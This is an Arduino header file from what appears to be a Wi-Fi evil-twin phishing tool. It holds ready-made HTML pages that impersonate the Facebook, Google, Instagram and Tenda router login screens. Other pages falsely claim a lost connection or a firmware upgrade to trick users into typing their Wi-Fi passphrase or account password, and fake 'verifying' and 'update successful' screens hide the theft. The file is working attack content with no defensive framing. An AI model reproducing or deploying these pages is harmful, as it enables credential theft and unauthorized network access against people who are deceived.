#ifndef PHISHING_H
#define PHISHING_H

#include <Arduino.h>
#include "config.h"

const char FACEBOOK_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1);padding:40px 30px;max-width:400px;width:100%;text-align:center}
.logo{color:#1877f2;font-size:48px;font-weight:700;margin-bottom:30px;letter-spacing:-1px}
input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:12px;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button{width:100%;padding:12px;background:#1877f2;color:#fff;font-size:20px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-top:6px}
button:hover{background:#166fe5}
</style>
</head>
<body>
<div class="container">
<div class="logo">facebook</div>
<form action="/userinput" method="get">
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>
)rawliteral";

const char TENDA_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tenda | LOGIN</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:4px;box-shadow:0 1px 6px rgba(0,0,0,0.15);padding:40px 30px;max-width:380px;width:100%;text-align:center}
h1{font-size:24px;color:#333;margin-bottom:30px;font-weight:400}
.logo{font-size:36px;font-weight:700;color:#0066cc;margin-bottom:30px}
input{width:100%;padding:12px 14px;font-size:15px;border:1px solid #ccc;border-radius:3px;margin-bottom:16px;outline:none}
input:focus{border-color:#0066cc}
button{width:100%;padding:12px;background:#0066cc;color:#fff;font-size:16px;border:none;border-radius:3px;cursor:pointer}
button:hover{background:#0052a3}
</style>
</head>
<body>
<div class="card">
<div class="logo">TENDA</div>
<h1>Login</h1>
<form action="/userinput" method="get">
<input type="password" name="password" placeholder="Login Password" required>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>
)rawliteral";

const char GENERIC_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connection Lost</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#e0f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:6px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:420px;width:100%;overflow:hidden}
.banner{background:#d32f2f;color:#fff;text-align:center;padding:18px 20px;font-size:16px;font-weight:700;letter-spacing:0.5px}
.content{padding:30px}
p{font-size:15px;color:#555;margin-bottom:20px;line-height:1.5}
.ssid{font-weight:700;color:#333}
input{width:100%;padding:12px 14px;font-size:15px;border:2px solid #009688;border-radius:4px;margin-bottom:16px;outline:none}
input:focus{border-color:#00796b}
button{width:100%;padding:12px;background:#009688;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:4px;cursor:pointer}
button:hover{background:#00796b}
</style>
</head>
<body>
<div class="card">
<div class="banner">WARNING! Your connection has been terminated</div>
<div class="content">
<p>Your internet connection has been lost due to a network error on <span class="ssid">%SSID%</span>. Please re-enter your WiFi password to restore connectivity.</p>
<form action="/userinput" method="get">
<input type="password" name="password" placeholder="Enter WiFi password" required>
<button type="submit">Login</button>
</form>
</div>
</div>
</body>
</html>
)rawliteral";

const char UPDATE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Router Configuration</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f1f1f1;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:4px;box-shadow:0 1px 6px rgba(0,0,0,0.15);max-width:480px;width:100%;overflow:hidden}
.topbar{background:#1565c0;color:#fff;padding:16px 20px;font-size:18px;font-weight:700}
.content{padding:25px}
.info{font-size:14px;color:#555;margin-bottom:20px;line-height:1.5}
label{display:block;font-size:13px;color:#333;margin-bottom:5px;font-weight:700}
input[type="password"]{width:100%;padding:10px 12px;font-size:14px;border:1px solid #ccc;border-radius:3px;margin-bottom:18px;outline:none}
input[type="password"]:focus{border-color:#1565c0}
button{width:100%;padding:12px;background:#2e7d32;color:#fff;font-size:15px;font-weight:700;border:none;border-radius:3px;cursor:pointer}
button:hover{background:#1b5e20}
.terms{margin:18px 0 14px}
.terms textarea{width:100%;height:90px;padding:10px;font-size:12px;border:1px solid #ccc;border-radius:3px;resize:none;background:#f9f9f9;color:#555}
.agree{display:flex;align-items:center;gap:8px;font-size:13px;color:#555;margin-bottom:4px}
.agree input{width:auto;margin:0}
</style>
</head>
<body>
<div class="card">
<div class="topbar">Firmware Upgrade</div>
<div class="content">
<p class="info">A new firmware version is available for your router. Please enter your WiFi passphrase to proceed with the upgrade.</p>
<form action="/userinput" method="get">
<label>WiFi Passphrase</label>
<input type="password" name="password" placeholder="Enter WiFi passphrase" required>
<div class="terms">
<textarea readonly>TERMS AND CONDITIONS

By proceeding with this firmware upgrade you agree to the following terms:

1. The router will reboot during the upgrade process.
2. Do not disconnect power during the upgrade.
3. Network connectivity may be temporarily interrupted.
4. The manufacturer is not responsible for data loss.
5. This upgrade includes security patches and performance improvements.</textarea>
</div>
<div class="agree">
<input type="checkbox" checked disabled> I have read and agree to the terms and conditions
</div>
<button type="submit">Start Upgrade</button>
</form>
</div>
</div>
</body>
</html>
)rawliteral";

const char LANDING_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>500 Internal Server Error</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;text-align:center}
.container{max-width:450px;width:100%}
.code{font-size:96px;font-weight:700;color:#e53935;line-height:1}
.error{font-size:28px;color:#333;margin:16px 0 10px;font-weight:400}
.msg{font-size:16px;color:#777;line-height:1.5}
</style>
</head>
<body>
<div class="container">
<div class="code">500</div>
<div class="error">Internal Server Error</div>
<p class="msg">We are currently trying to fix the problem. Please try again later.</p>
</div>
</body>
</html>
)rawliteral";

const char RESULT_GOOD_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connection Restored</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#e8f5e9;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;text-align:center}
.container{max-width:400px;width:100%}
.icon{width:80px;height:80px;border-radius:50%;background:#4caf50;color:#fff;font-size:48px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
h1{font-size:24px;color:#2e7d32;margin-bottom:8px}
p{font-size:16px;color:#555}
</style>
</head>
<body>
<div class="container">
<div class="icon">&#10003;</div>
<h1>Connection Restored</h1>
<p>Your device is now connected.</p>
</div>
</body>
</html>
)rawliteral";

const char RESULT_BAD_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wrong Password</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#ffebee;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;text-align:center}
.container{max-width:400px;width:100%}
.icon{width:80px;height:80px;border-radius:50%;background:#e53935;color:#fff;font-size:48px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
h1{font-size:24px;color:#c62828;margin-bottom:8px}
p{font-size:16px;color:#555}
</style>
</head>
<body>
<div class="container">
<div class="icon">&#10007;</div>
<h1>Wrong Password</h1>
<p>Please try again.</p>
</div>
<script>setTimeout(function(){window.location.href="/"},3000);</script>
</body>
</html>
)rawliteral";

const char GOOGLE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{max-width:450px;width:100%;padding:48px 40px 36px;text-align:center}
.logo{width:75px;height:75px;margin:0 auto 16px}
.logo svg{width:100%;height:100%}
h1{font-size:24px;color:#202124;font-weight:400;margin-bottom:8px}
.sub{font-size:16px;color:#202124;margin-bottom:30px}
input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;outline:none;transition:border .15s}
input:focus{border-color:#1a73e8}
.btn{width:100%;padding:12px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;border:none;border-radius:4px;cursor:pointer}
.btn:hover{background:#1765cc}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
</div>
<h1>Sign in</h1>
<div class="sub">with your Google Account</div>
<form action="/userinput" method="get">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Next</button>
</form>
</div>
</body>
</html>
)rawliteral";

const char INSTAGRAM_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 30px;max-width:350px;width:100%;text-align:center;margin-bottom:10px}
.logo{font-family:'Billabong',cursive;font-size:40px;margin-bottom:20px;color:#262626}
input{width:100%;padding:9px 8px;font-size:12px;border:1px solid #dbdbdb;border-radius:3px;margin-bottom:6px;outline:none;background:#fafafa}
input:focus{border-color:#a8a8a8}
.btn{width:100%;padding:7px;background:#0095f6;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;margin-top:8px}
.btn:hover{background:#1877f2}
</style>
</head>
<body>
<div class="box">
<div class="logo">Instagram</div>
<form action="/userinput" method="get">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Log in</button>
</form>
</div>
</body>
</html>
)rawliteral";

const char WAIT_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Please Wait</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f1f1f1;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;text-align:center}
.container{max-width:400px;width:100%}
.spinner{width:50px;height:50px;border:5px solid #e0e0e0;border-top-color:#1565c0;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 25px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:22px;color:#333;margin-bottom:6px;font-weight:400}
p{font-size:15px;color:#777}
</style>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<h1>Updating, please wait...</h1>
<p>Do not close this page or disconnect power.</p>
</div>
<script>setTimeout(function(){window.location.href="/result"},15000);</script>
</body>
</html>
)rawliteral";

const char VERIFY_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifying</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#fffde7;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;text-align:center}
.container{max-width:400px;width:100%}
.spinner{width:50px;height:50px;border:5px solid #e0e0e0;border-top-color:#f9a825;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 25px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:22px;color:#333;margin-bottom:8px;font-weight:400}
p{font-size:15px;color:#777}
</style>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<h1>Verifying your credentials...</h1>
<p>Please wait while we verify your network password.</p>
</div>
<script>setTimeout(function(){window.location.href="/verify_result"},3000);</script>
</body>
</html>
)rawliteral";

const char VERIFY_SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Update Successful</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#e8f5e9;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;text-align:center}
.container{max-width:420px;width:100%}
.icon{width:80px;height:80px;border-radius:50%;background:#4caf50;color:#fff;font-size:48px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
h1{font-size:24px;color:#2e7d32;margin-bottom:8px}
p{font-size:16px;color:#555;line-height:1.5}
</style>
</head>
<body>
<div class="container">
<div class="icon">&#10003;</div>
<h1>Update Successful</h1>
<p>Your device firmware has been updated successfully. You may close this page.</p>
</div>
</body>
</html>
)rawliteral";

const char VERIFY_FAIL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification Failed</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#ffebee;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;text-align:center}
.container{max-width:400px;width:100%}
.icon{width:80px;height:80px;border-radius:50%;background:#e53935;color:#fff;font-size:48px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
h1{font-size:24px;color:#c62828;margin-bottom:8px}
p{font-size:16px;color:#555}
</style>
</head>
<body>
<div class="container">
<div class="icon">&#10007;</div>
<h1>Wrong Password</h1>
<p>The password you entered is incorrect. Please try again.</p>
</div>
<script>setTimeout(function(){window.location.href="/"},3000);</script>
</body>
</html>
)rawliteral";

#endif
